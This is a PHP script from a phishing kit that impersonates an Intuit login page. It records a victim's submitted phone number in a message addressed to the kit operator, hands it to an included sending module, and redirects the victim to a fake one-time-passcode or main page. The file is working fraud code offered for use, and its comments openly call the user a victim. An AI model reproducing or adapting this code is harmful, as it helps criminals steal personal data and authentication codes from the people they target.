<?php
require_once('./Module/Setmodule.php');
$message .= "|Wassup, $yourname|| #Victim Submited PHONE NUMBER to your INTUIT page \n"."\n";
$message .= "|Phone: ".$_POST['phone']."\n\n"; 

require_once('Module/SendModule.php');


  

	
if($settings['Display_OTP'] == "1"){
	header("Location: ../otp.php?online_id=".$key."login_id=$praga$praga&session=$praga$praga");
  }
    
  else{
	header("Location: ../main.php?online_id=".$key."login_id=$praga$praga&session=$praga$praga");
  }
  
  
?>